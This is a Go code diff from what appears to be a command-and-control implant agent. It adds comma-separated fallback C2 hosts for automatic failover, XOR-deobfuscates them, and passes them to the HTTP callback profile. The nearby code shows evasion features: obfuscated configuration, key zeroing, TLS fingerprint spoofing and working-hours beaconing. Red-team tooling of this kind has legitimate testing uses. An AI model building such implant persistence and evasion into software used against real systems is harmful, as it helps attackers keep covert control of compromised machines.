@@ -49,6 +49,7 @@ var (
 	proxyURL          string = ""     // HTTP/SOCKS proxy URL (e.g., http://proxy:8080)
 	tlsVerify         string = "none" // TLS verification: none, system-ca, pinned:<fingerprint>
 	tlsFingerprint    string = ""     // TLS ClientHello fingerprint: chrome, firefox, safari, edge, random, go (default)
+	fallbackHosts     string = ""     // Comma-separated fallback C2 URLs for automatic failover
 	workingHoursStart string = ""     // Working hours start (HH:MM, 24hr local time)
 	workingHoursEnd   string = ""     // Working hours end (HH:MM, 24hr local time)
 	workingDays       string = ""     // Active days (1-7, Mon=1, Sun=7, comma-separated)
@@ -93,6 +94,7 @@ func runAgent() {
 			hostHeader = xorDecodeString(hostHeader, keyBytes)
 			proxyURL = xorDecodeString(proxyURL, keyBytes)
 			customHeaders = xorDecodeString(customHeaders, keyBytes)
+			fallbackHosts = xorDecodeString(fallbackHosts, keyBytes)
 			// Zero the XOR key — no longer needed after deobfuscation
 			zeroBytes(keyBytes)
 		}
@@ -240,6 +242,22 @@ func runAgent() {
 			callbackURL = fmt.Sprintf("http://%s:%d", callbackHost, callbackPortInt)
 		}
 
+		// Parse fallback C2 URLs (comma-separated, each gets same port appended if needed)
+		var fallbackURLs []string
+		if fallbackHosts != "" {
+			for _, fb := range strings.Split(fallbackHosts, ",") {
+				fb = strings.TrimSpace(fb)
+				if fb == "" {
+					continue
+				}
+				if strings.HasPrefix(fb, "http://") || strings.HasPrefix(fb, "https://") {
+					fallbackURLs = append(fallbackURLs, fmt.Sprintf("%s:%d", fb, callbackPortInt))
+				} else {
+					fallbackURLs = append(fallbackURLs, fmt.Sprintf("http://%s:%d", fb, callbackPortInt))
+				}
+			}
+		}
+
 		httpProfile := http.NewHTTPProfile(
 			callbackURL,
 			userAgent,
@@ -254,6 +272,7 @@ func runAgent() {
 			proxyURL,
 			tlsVerify,
 			tlsFingerprint,
+			fallbackURLs,
 		)
 		// Decode and apply custom HTTP headers from C2 profile
 		if customHeaders != "" {
@@ -789,6 +808,7 @@ func clearGlobals() {
 	xorKey = ""
 	tlsVerify = ""
 	tlsFingerprint = ""
+	fallbackHosts = ""
 	tcpBindAddress = ""
 
 	// Operational parameters
